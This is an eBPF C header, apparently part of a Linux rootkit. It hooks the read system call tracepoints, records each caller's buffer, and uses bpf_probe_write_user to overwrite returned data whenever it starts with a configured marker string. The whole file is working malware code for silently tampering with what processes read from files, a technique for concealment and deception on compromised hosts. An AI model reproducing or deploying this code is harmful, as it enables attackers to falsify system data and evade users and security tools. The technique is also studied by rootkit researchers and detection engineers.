#ifndef __FS_H
#define __FS_H

#include "headervmlinux.h"
/*#include <stdio.h>
#include <linux/types.h>
#include <unistd.h>
#include <string.h>
#include <linux/ptrace.h>
#include <linux/stat.h>*/
#include <ctype.h>

#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#include "../../../common/constants.h"
#include "../../../common/map_common.h"
#include "../data/ring_buffer.h"
#include "map_defs.h"
#include "../utils/strings.h"

/**
 * https://github.com/torvalds/linux/blob/master/kernel/trace/trace_syscalls.c#L673
 */
struct sys_read_exit_ctx {
    unsigned long long unused; //Pointer to pt_regs
    int __syscall_nr;
    long ret;
};

/**
 * https://github.com/torvalds/linux/blob/master/kernel/trace/trace_syscalls.c#L588
 */
struct sys_read_enter_ctx {
    unsigned long long unused; //Pointer to pt_regs
    int __syscall_nr;
    unsigned int padding; //Alignment
    unsigned long fd;
    char* buf;
    size_t count;
};

static __always_inline int handle_sys_read(struct sys_read_enter_ctx *ctx, int fd, char* buf){
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    __u32 pid = pid_tgid >> 32;
    struct fs_open_data data = {
        .buf = buf,
        .fd = fd,
        .pid = pid
    };
    bpf_map_update_elem(&fs_open, &pid_tgid, &data, BPF_ANY);
    //bpf_printk("IN PID: %u, FS:%u\n", pid, fd);
    return 0;
}

/**
 * @brief Receives read event and stores the parameters into internal map
 * 
 */
SEC("tracepoint/syscalls/sys_enter_read") 
int kprobe_ksys_read(struct sys_read_enter_ctx *ctx) { 
    struct sys_read_enter_ctx *rctx = ctx; 
    if (ctx == NULL){
        bpf_printk("Error\n");
        return 0; 
    }

    int fd = (int) ctx->fd; 
    char *buf = (char*) ctx->buf; 
    return handle_sys_read(ctx, fd, buf); 
} 

/**
 * @brief Called AFTER the ksys_read call, checks the internal
 * map for the tgid+pid used and extracts the parameters.
 * Uses the user-space buffer reference for overwritting the returned
 * values. 
 * 
 */
SEC("tracepoint/syscalls/sys_exit_read")
int kretprobe_vfs_read(struct sys_read_exit_ctx *ctx){
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    if(pid_tgid<0){
        //bpf_printk("Out\n");
        return -1;
    }
    //bpf_printk("OUT PID: %u\n", pid_tgid>>32);

    struct fs_open_data *data = (struct fs_open_data*) bpf_map_lookup_elem(&fs_open, &pid_tgid);
    if (data == NULL || data->buf == NULL){
        //Not found
        //bpf_printk("Not found\n");
        return -1;
    }

    //Overwritting a byte of the buffer
    char *buf = data->buf;
    __u32 pid = data->pid;
    char msg_original[] = STRING_FS_HIDE;
    char msg_overwrite[] = STRING_FS_OVERWRITE;
    char c_buf[sizeof(msg_overwrite)] = {0};
    
    if(buf == NULL){
        return -1;
    }
    
#pragma unroll
    for(int ii=0; ii<sizeof(msg_original)-1; ii++){
        if(bpf_probe_read_user(c_buf+ii, 1, buf+ii)<0){
            //bpf_printk("Error reading\n");
            return -1;
        }
        char c = (char)*(c_buf+ii);
        
        if( c != msg_original[ii]){
            //Not the string we are looking for
            //if(ii>0)bpf_printk("Discarded string, expected %i and received %i, %s\n", c, msg_original[ii], buf);
            return -1;
        }
        if(c<32 || c>126){ //Not alphanumeric or symbol
            //bpf_printk("Discarded string at pid cause c %u, %s\n", pid, buf);
            return -1;
        }
        
    }

    bpf_printk("Overwritting at pid %u, %s\n", pid, buf);
    if(bpf_probe_write_user((void*)buf, (void*)msg_overwrite, (__u32)sizeof(msg_overwrite)-1)<0){
        bpf_printk("Error writing to user memory\n");
    }
    

    return 0;
}

#endif